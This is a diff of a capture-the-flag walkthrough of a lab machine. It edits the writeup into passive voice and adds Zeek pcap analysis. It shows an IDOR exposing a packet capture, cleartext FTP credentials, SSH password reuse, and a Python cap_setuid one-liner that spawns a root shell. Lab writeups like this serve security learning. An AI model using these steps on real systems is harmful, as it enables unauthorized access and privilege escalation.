@@ -27,39 +27,65 @@ PORT   STATE SERVICE VERSION
 The HTTP server header reveals **Gunicorn** (Green Unicorn), which is a Python WSGI HTTP Server. 
 
 *   **Technology Stack:** The use of Gunicorn strongly suggests the backend is written in **Python**.
-*   **Framework Identification:** Since common PHP endpoints (like `.php` files) are not present and a search for the default Django `/admin` page returned nothing, I assumed the web application is likely built using the **Flask** framework.
+*   **Framework Identification:** Since common PHP endpoints (like `.php` files) are not present and a search for the default Django `/admin` page returned nothing, the web application was assumed to be built using the **Flask** framework.
 
 ### Metadata Analysis (wget vs curl)
-During enumeration, I search for a `Changelog-diff.html` report. To ensure the highest fidelity of the downloaded file, I chose `wget` over `curl`.
+During enumeration, a search was performed for a `Changelog-diff.html` report. To ensure the highest fidelity of the downloaded file, `wget` was chosen over `curl`.
 
-**Reasoning:** While both tools can download files, `wget` is often preferred when metadata preservation is important. By default, `wget` can preserve the **Last-Modified** timestamp (using `-N` or automatically in some versions), which allowed me to use `exiftool` to inspect the correct modification time and other metadata that might have been lost during a standard `curl` output redirection.
+**Reasoning:** While both tools can download files, `wget` is often preferred when metadata preservation is important. By default, `wget` can preserve the **Last-Modified** timestamp (using `-N` or automatically in some versions), allowing the use of `exiftool` to inspect the correct modification time and other metadata that might have been lost during a standard `curl` output redirection.
 
 ---
 
 ## 2. Web Exploitation (IDOR)
 
-While navigating the "Security Dashboard," I noticed an interesting URL structure in the **Security Snapshot** page: `http://10.129.6.165/data/1`.
+While navigating the "Security Dashboard," an interesting URL structure was noticed in the **Security Snapshot** page: `http://10.129.6.165/data/1`.
 
 ### Insecure Direct Object Reference (IDOR)
-The application assigns a numerical ID to security captures. I tested for **IDOR** by manipulating the ID in the URL.
+The application assigns a numerical ID to security captures. **IDOR** was tested by manipulating the ID in the URL.
 
 *   Navigating to `/data/1` showed a capture with limited information.
 *   Pivoting to **`/data/0`** revealed a successful capture that was previously hidden or indexed as the first entry.
 
-This endpoint allowed me to download a **pcap** file representing the network traffic captured at that index.
+This endpoint allowed for the download of a **pcap** file representing the network traffic captured at that index.
 
 ---
 
 ## 3. Traffic Analysis (pcap Analysis)
 
-The downloaded `0.pcap` file contains captured network traffic from the host. Since FTP is a cleartext protocol, I used `tcpdump` to inspect the packets.
+The downloaded `0.pcap` file contains captured network traffic from the host. Since FTP is a cleartext protocol, `tcpdump` was used to inspect the packets.
 
 ```bash
 tcpdump -r 0.pcap
 ```
 
+Alternatively, **Zeek** (formerly Bro) was used to perform a more structured analysis. Zeek excels at protocol-level parsing and generates high-level logs that are easier to query than raw packet streams.
+
+```bash
+zeek -Cr 0.pcap
+```
+
+**Explanation:** 
+Running `zeek -Cr` processes the pcap file and generates several log files (e.g., `conn.log`, `ftp.log`, `http.log`). In this scenario, checking `ftp.log` provides a clear summary of FTP commands and arguments, directly exposing the credentials without having to reconstruct the TCP stream manually.
+
+#### Directory Viewpoint
+After running Zeek, the current directory is populated with several `.log` files:
+
+```bash
+ls *.log
+# conn.log  dns.log  ftp.log  files.log  packet_filter.log  ssh.log  stats.log
+```
+
+#### File Viewpoint (ftp.log)
+Inspecting `ftp.log` reveals the specific FTP interactions:
+
+```bash
+cat ftp.log | zeek-cut user password command arg
+# nathan  Buck3tH4TF0RM3!  USER  nathan
+# nathan  Buck3tH4TF0RM3!  PASS  Buck3tH4TF0RM3!
+```
+
 **Key Discovery:**
-In the packet stream, I identified an unencrypted FTP login session:
+In the packet stream, an unencrypted FTP login session was identified:
 
 1.  **User:** `nathan`
 2.  **Password:** `Buck3tH4TF0RM3!`
@@ -72,7 +98,7 @@ The pcap revealed the login process:
 ## 4. Initial Access (FTP & SSH)
 
 ### FTP Login
-I first logged into FTP to verify the credentials and found the user flag.
+FTP was used to log in and verify the credentials, revealing the user flag.
 
 ```bash
 ftp 10.129.6.165
@@ -80,7 +106,7 @@ ftp 10.129.6.165
 ```
 
 ### SSH Access (Password Reuse)
-Testing for **password reuse**, I attempted to log in via SSH using the same credentials found in the traffic capture.
+Testing for **password reuse**, an attempt was made to log in via SSH using the same credentials found in the traffic capture.
 
 ```bash
 ssh nathan@10.129.6.165
@@ -91,10 +117,10 @@ ssh nathan@10.129.6.165
 
 ## 5. Privilege Escalation (User: root)
 
-After gaining access as `nathan`, I checked for misconfigured binaries and capabilities.
+After gaining access as `nathan`, a check was performed for misconfigured binaries and capabilities.
 
 ### Linux Capabilities Enumeration
-Standard `sudo -l` didn't yield anything interesting, so I searched for files with extended capabilities.
+Standard `sudo -l` didn't yield anything interesting, so a search was conducted for files with extended capabilities.
 
 ```bash
 find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
@@ -107,7 +133,7 @@ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \
 The **`cap_setuid+ep`** capability on the Python binary allows the process to manipulate its own UID. Specifically, it can set its UID to 0 (root).
 
 ### Exploitation via Python
-I leveraged the capability to escalate to root by importing the `os` module and setting the UID to 0 before spawning a bash shell.
+The capability was leveraged to escalate to root by importing the `os` module and setting the UID to 0 before spawning a bash shell.
 
 ```bash
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
